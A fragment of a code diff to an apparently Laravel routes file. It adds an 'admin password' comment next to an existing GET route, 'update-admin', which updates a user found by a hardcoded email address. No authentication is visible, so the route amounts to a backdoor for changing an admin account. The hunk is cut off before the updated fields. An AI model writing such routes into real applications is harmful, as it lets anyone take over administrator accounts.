@@ -66,9 +66,13 @@ use App\Models\User;
   |
  */
 
+// admin password
+
+
 
  Route::post('/inquiries/request-offer', [InquiryController::class, 'requestOffer'])
         ->name('inquiry.requestOffer');
+
 Route::get('update-admin', function () {
     User::where('email', 'mokdev18@gmail.com')
         ->update([
